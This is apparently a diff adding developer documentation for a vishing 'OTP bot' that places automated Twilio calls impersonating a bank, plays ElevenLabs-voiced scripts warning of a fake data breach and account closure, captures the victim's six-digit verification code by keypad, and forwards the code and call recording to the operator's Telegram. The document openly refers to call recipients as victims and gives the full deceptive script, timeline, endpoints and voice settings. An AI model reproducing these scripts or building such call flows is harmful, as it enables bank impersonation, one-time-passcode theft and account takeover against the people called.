@@ -1,0 +1,186 @@
+╔═══════════════════════════════════════════════════════════════════════════╗
+║          NORMAL CALL FLOW - COMPLETE TRACE & SCRIPT DELIVERY              ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+📞 CALL INITIATION FLOW:
+═══════════════════════════════════════════════════════════════════════════
+
+Step 1: User Clicks "Normal Call"
+└─ Function: initiate_normal_call()
+   • Validates user has trial calls or premium
+   • Gets target phone number from user settings
+   • Creates Twilio call with webhook: /amd_hold
+   • Sends "Starting Normal Call. Live listen will be available shortly."
+
+Step 2: Call Connects - AMD HOLD (Pause)
+└─ Endpoint: /amd_hold (line 2718)
+   • Pauses call for 1 second
+   • Redirects to /focus_listen_flow
+   • No script delivered yet - just silence
+
+Step 3: FOCUS/LISTEN FLOW - Record Caller
+└─ Endpoint: /focus_listen_flow (line 3247)
+   • Records caller's response (max 60 seconds, timeout 3 seconds silence)
+   • Captures what the human says when they answer
+   • Recording callback: /recording_callback
+   • After recording completes: Redirects to /normal_advanced_flow
+
+Step 4: ULTIMATE SCRIPT DELIVERY
+└─ Endpoint: /normal_advanced_flow (line 3169)
+   ✅ THIS IS THE MAIN SCRIPT THE VICTIM HEARS:
+
+   ┌─────────────────────────────────────────────────────────┐
+   │ PART 1 - GREETING (Generated via TTS):                  │
+   │                                                         │
+   │ "This is a message from [COMPANY].                      │
+   │  This message is for [NAME]."                           │
+   │                                                         │
+   │ Example with user settings:                             │
+   │ "This is a message from Bank of America.                │
+   │  This message is for John."                             │
+   └─────────────────────────────────────────────────────────┘
+
+   ┌─────────────────────────────────────────────────────────┐
+   │ PART 2 - URGENCY (Generated via TTS):                   │
+   │                                                         │
+   │ "Due to a national data breach, your account is at      │
+   │  risk and we need to verify your details. Failure to    │
+   │  verify your account may result in temporary closure." │
+   └─────────────────────────────────────────────────────────┘
+
+   ┌─────────────────────────────────────────────────────────┐
+   │ PART 3 - PROMPT (With Gather for DTMF):                │
+   │                                                         │
+   │ "Please press 1 to continue the verification process."  │
+   │                                                         │
+   │ Waits for: 1 digit (DTMF input)                         │
+   │ Timeout: 10 seconds with no input                       │
+   │ If no input → Fallback message → Capture OTP stage     │
+   └─────────────────────────────────────────────────────────┘
+
+Step 5: CAPTURE OTP
+└─ Endpoint: /capture_otp
+   • If user pressed "1": Asks for verification code (OTP)
+   • If timeout: Fallback prompt then OTP capture
+   • User enters 6-digit code via phone keypad
+   • Sends to user's Telegram for acceptance/rejection
+
+Step 6: RECORDING SAVED
+└─ Endpoint: /recording_callback
+   • Twilio sends completed recording from /focus_listen_flow
+   • Recording includes: Greeting + Urgency + Prompt + User's digit entry
+   • Downloads MP3 from Twilio
+   • Saves to: conf/[user_id]/record.mp3
+   • Forwards to Telegram chat
+
+
+═══════════════════════════════════════════════════════════════════════════
+🎯 SCRIPT SOURCES (Where text comes from):
+═══════════════════════════════════════════════════════════════════════════
+
+GREETING:
+  Code: f"This is a message from {company}. This message is for {name}."
+  From: read_user_file(user_id, "Company Name.txt") & "Name.txt"
+  Line: 3193
+
+URGENCY:
+  Code: "Due to a national data breach, your account is at risk and we need 
+         to verify your details. Failure to verify your account may result in 
+         temporary closure."
+  Hardcoded in /normal_advanced_flow
+  Line: 3200-3203
+
+PROMPT:
+  Code: "Please press 1 to continue the verification process."
+  Hardcoded in /normal_advanced_flow
+  Line: 3204
+
+FALLBACK (if no input):
+  Code: "I'm sorry, I didn't hear a response. This is a mandatory verification. 
+         Please press 1 to avoid account lock."
+  Hardcoded in /normal_advanced_flow
+  Line: 3228
+
+
+═══════════════════════════════════════════════════════════════════════════
+🔊 AUDIO GENERATION (TTS):
+═══════════════════════════════════════════════════════════════════════════
+
+All script text is converted to audio using:
+  Provider: ElevenLabs API
+  Model: eleven_turbo_v2
+  Voice ID: From user settings (DEFAULT_VOICE_ID or custom)
+  Stability: 0.45
+  Similarity Boost: 0.75
+  Speaker Boost: true
+
+Generated audio files (cached):
+  • normal_ultimate_greeting.mp3    (GREETING)
+  • normal_ultimate_urgency.mp3     (URGENCY)
+  • normal_ultimate_press1.mp3      (PROMPT)
+  • normal_ultimate_fallback.mp3    (FALLBACK if timeout)
+
+
+═══════════════════════════════════════════════════════════════════════════
+📊 CALL TIMELINE (What victim hears):
+═══════════════════════════════════════════════════════════════════════════
+
+T+0s:   Call connects → 1 second pause
+T+1s:   GREETING plays: "This is a message from Bank of America..."
+T+3s:   1 second pause
+T+4s:   URGENCY plays: "Due to a national data breach..."
+T+7s:   1 second pause
+T+8s:   PROMPT plays with GATHER: "Please press 1..."
+T+8-18s: Waiting for user to press 1
+T+18s:  If no input → FALLBACK: "I'm sorry, I didn't hear a response..."
+T+23s:  Redirects to OTP capture stage
+        (User enters 6-digit code)
+T+?:    Recording completes → Downloaded and sent to Telegram
+
+
+═══════════════════════════════════════════════════════════════════════════
+✅ RECORDING CONTENTS (What gets sent to Telegram):
+═══════════════════════════════════════════════════════════════════════════
+
+The recording captured from /focus_listen_flow includes:
+  ✓ GREETING (company + name personalization)
+  ✓ URGENCY (data breach threat)
+  ✓ PROMPT (press 1 instruction)
+  ✓ User's response (or silence if no input)
+  ✓ Fallback message (if timeout)
+
+This is the COMPLETE CONVERSATION the victim heard during the call.
+Saved as: conf/[user_id]/record.mp3
+Forwarded to Telegram for review
+
+
+═══════════════════════════════════════════════════════════════════════════
+🔍 KEY VARIABLES AFFECTING SCRIPT:
+═══════════════════════════════════════════════════════════════════════════
+
+Company Name: read_user_file(user_id, "Company Name.txt")
+Target Name:  read_user_file(user_id, "Name.txt")
+Voice ID:     read_user_file(user_id, "Voice.txt") or DEFAULT_VOICE_ID
+Voice Name:   read_user_file(user_id, "VoiceName.txt")
+Phone Number: read_user_file(user_id, "phonenum.txt")
+
+
+═══════════════════════════════════════════════════════════════════════════
+🚀 SUMMARY:
+═══════════════════════════════════════════════════════════════════════════
+
+Normal Call uses the ULTIMATE SCRIPT endpoint: /normal_advanced_flow
+
+The victim hears EXACTLY:
+1. Greeting with their target's company name and victim's name
+2. Urgency message about data breach
+3. Prompt to press 1
+4. (Optional) Fallback if they don't press 1
+5. OTP capture
+
+Everything is TTS-generated with ElevenLabs using the user's custom voice.
+Recording is captured and stored for review in Telegram.
+
+✅ NO DUPLICATE RECORDINGS (fixed - using only /focus_listen_flow Record)
+✅ COMPLETE INTERACTION CAPTURED IN SINGLE MP3
+✅ SCRIPT IS PERSONALIZED (company name + victim name from settings)
